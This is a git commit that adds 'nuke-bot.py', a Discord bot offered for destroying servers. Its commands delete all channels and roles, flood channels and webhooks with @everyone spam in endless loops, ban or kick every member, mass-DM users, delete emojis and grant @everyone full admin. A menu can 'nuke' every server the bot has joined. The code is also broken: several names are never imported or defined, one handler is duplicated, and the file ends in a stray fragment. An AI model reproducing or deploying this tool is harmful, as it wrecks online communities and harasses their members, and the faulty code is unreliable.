e42df2ecf3b4c671c5554e327e3a2d435c59fef5
mamanop <142068250+mamanop@users.noreply.github.com>
2023-09-01 11:43:02 +0530

    Add files via upload

---
+++ nuke-bot.py
@@ -0,0 +1,239 @@
+﻿import discord
+from discord.ext import commands
+from colorama import init, Fore as cc
+from os import name as os_name, system
+from sys import exit
+init()
+dr = DR = r = R = cc.LIGHTRED_EX
+g = G = cc.LIGHTGREEN_EX
+b = B = cc.LIGHTBLUE_EX
+m = M = cc.LIGHTMAGENTA_EX
+c = C = cc.LIGHTCYAN_EX
+y = Y = cc.LIGHTYELLOW_EX
+w = W = cc.RESET
+
+clear = lambda: system('cls') if os_name == 'nt' else system('clear')
+def _input(text):print(text, end='');return input()
+
+baner = f'''
+{r} _   _       _       {m} ____        _   
+{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
+{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
+{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
+{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
+{y}Made by: {g}LIGZO'''
+
+
+
+channel_names = ['Nuked by NUKER']
+message_spam = ['@everyone NUKED BY NUKER  ']
+webhook_names = ['NUKED BY THAVALLA' ]
+###################################################################################
+@client.event
+async def on_ready():
+  await client.change_presence(activity=discord.Game(name= "/HELP IS PERFIX" ))#change this if you want
+  
+
+@client.command()
+async def hi(ctx, amount=50):
+  await ctx.message.delete()
+  await ctx.guild.edit(name="NUKED")
+  channels = ctx.guild.channels
+  for channel in channels:
+    try:
+      await channel.delete()
+      print(f"\x1b[38;5;34m{channel.name} Has Been Successfully Deleted!")
+    except:
+        pass
+        print ("\x1b[38;5;196mUnable To Delete Channel!")
+        guild = ctx.message.guild
+  for i in range(amount):
+    try:  
+      await ctx.guild.create_text_channel(random.choice(channel_names))
+      print(f"\x1b[38;5;34mSuccessfully Made Channel [{i}]!")
+    except:
+      print("\x1b[38;5;196mUnable To Create Channel!")
+  for role in ctx.guild.roles:
+    try:
+      await role.delete()
+      print(f"\x1b[38;5;34m{role.name} \x1b[38;5;34mHas Been Successfully Deleted!")
+
+    except:
+      print(f"\x1b[38;5;196m{role.name} Is Unable To Be Deleted")
+  await asyncio.sleep(2)
+  for i in range(100):  
+    for i in range(1000):
+      for channel in ctx.guild.channels:
+        try:
+          await channel.send(random.choice(message_spam)
+        )
+          print(f"\x1b[38;5;34m{channel.name} Has Been Pinged!")
+        except:
+          print(f"\x1b[38;5;196mUnable To Ping {channel.name}!")
+    for member in ctx.guild.members:
+      if member.id != 847570148198318120:  
+        try:
+          await member.ban(reason= "NUKED BY NUKER")
+          print(f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
+        except:
+          print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
+          
+
+@client.event
+async def on_guild_channel_create(channel):
+  while True:
+    await channel.send(random.choice(message_spam))
+
+
+@client.event
+async def on_guild_channel_create(channel):
+  webhook =await channel.create_webhook(name = random.choice(webhook_names))  
+  while True:  
+    await channel.send(random.choice(message_spam))
+    await webhook.send(random.choice(message_spam), username=random.choice(webhook_names))
+
+
+
+@client.command()
+async def banall(ctx):
+  await ctx.message.delete()
+  for member in ctx.guild.members:
+    if member.id != 1:
+     for user in list(ctx.guild.members):
+       try:
+         await ctx.guild.ban(user)
+         print (f"\x1b[38;5;34m{member.name} Has Been Successfully Banned In {ctx.guild.name}")
+       except:
+         print(f"\x1b[38;5;196mUnable To Ban {member.name} In {ctx.guild.name}!")
+  
+
+
+@client.command()
+async def kickall(ctx):
+  await ctx.message.delete()
+  for member in ctx.guild.members:
+    try:
+      await member.kick(reason="NUKED BY nuker")
+      print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
+    except:
+      print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")
+
+
+@client.command()
+async def rolespam(ctx):
+  await ctx.message.delete()
+  for i in range(1, 250):
+    try:
+      await ctx.guild.create_role(name=f"NUKED BY NUKER")
+      print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
+    except:
+      print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")
+
+
+@client.command(pass_context=True)
+async def emojidel(ctx):
+ await ctx.message.delete()
+ for emoji in list(ctx.guild.emojis):
+            try:
+                await emoji.delete()
+                print (f"\x1b[38;5;34mSuccessfully Deleted Emoji {emoji.name} In {ctx.guild.name}!")
+            except:
+                print (f"\x1b[38;5;196mUnable To Delete Emoji {emoji.name} In {ctx.guild.name}!")
+
+
+@client.command()
+async def d(ctx, *, message:str):
+  await ctx.message.delete()
+  for user in list(ctx.guild.members):
+    try:
+      await user.send(message)
+      print(f"\x1b[38;5;34mDMed All Members In {ctx.guild.name}!")
+    except:
+      print(f"\x1b[38;5;196mUnable To DM Members In {ctx.guild.name}!")
+
+
+@client.command(pass_context=True)
+async def a(ctx):
+  await ctx.message.delete()
+  for role in list(ctx.guild.roles):
+             if role.name == '@everyone':
+                  try:
+                      await role.edit(permissions=Permissions.all())
+                      print(f"\x1b[38;5;34mGave @everyone Admin In {ctx.guild.name}!") 
+                  except:
+                      print(f"\x1b[38;5;196mUnable To Give @everyone Admin In {ctx.guild.name}!")
+
+async def nuke_guild(guild):
+    print(f'{r}Nuke: {m}{guild.name}')
+    banned = await ban_all_members(guild)
+    print(f'{m}Banned:{b}{banned}')
+    deleted_channels = await delete_all_channel(guild)
+    print(f'{m}Delete Channels:{b}{deleted_channels}')
+    delete_roles = await delete_all_roles(guild)
+    print(f'{m}Delete Roles:{b}{delete_roles}')
+    created_channels = await create_channels(guild,name)
+    print(f'{m}Create  Channels:{b}{created_channels}')
+    #created_roles = await created_roles(guild,name)
+    #print(f'{m}Create Roles:{b}{created_roles}')
+    print(f'{r}--------------------------------------------\n\n')
+
+
+while True:
+    clear()
+    choice = input(f'''   
+{baner}                
+{c}--------------------------------------------
+{b}[Menu]
+    {y}└─[1] {m}- {g}Run Setup Nuke Bot
+    {y}└─[2] {m}- {g}Exit
+{y}====>{g}''')
+    if choice == '1':
+        token = _input(f'{y}Input bot token:{g}')
+        name = _input(f'{y}Input name for created channels / roles:{g}')
+        clear()
+        choice_type = _input(f'''
+{baner}                
+{c}--------------------------------------------
+{b}[Select]
+    {y}└─[1] {m}- {g}Nuke of all servers.
+    {y}└─[2] {m}- {g}Nuke only one server.  
+    {y}└─[3] {m}- {g}Exit
+{y}====>{g}''')
+        client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
+        if choice_type == '1':
+            @client.event
+            async def on_ready():
+                print(f'''
+[+]Logged as {client.user.name}
+[+]Bot in {len(client.guilds)} servers!''')
+                for guild in client.guilds:
+                    await nuke_guild(guild)
+                await client.close()
+        elif choice_type == '2':
+            guild_id =  _input(f'{y}Input server id:{g}')
+            @client.event
+            async def on_ready():
+                for guild in client.guilds:
+                    if str(guild.id) == guild_id:
+                        await nuke_guild(guild)
+                await client.close()
+        elif choice_type == '3':
+            print(f'{dr}Exit...')
+            exit()
+        try:
+            client.run(token)
+            input('Nuke finished, press enter for return to menu...')
+        except Exception as error:
+            if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
+                input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
+            else:
+                input(f'{r}{error}\n{b}Press enter for return...')
+            continue
+    elif choice == '2':
+        print(f'{dr}Exit...')
+        exit()
+        
+        try:
+            client.run(token)
+
+
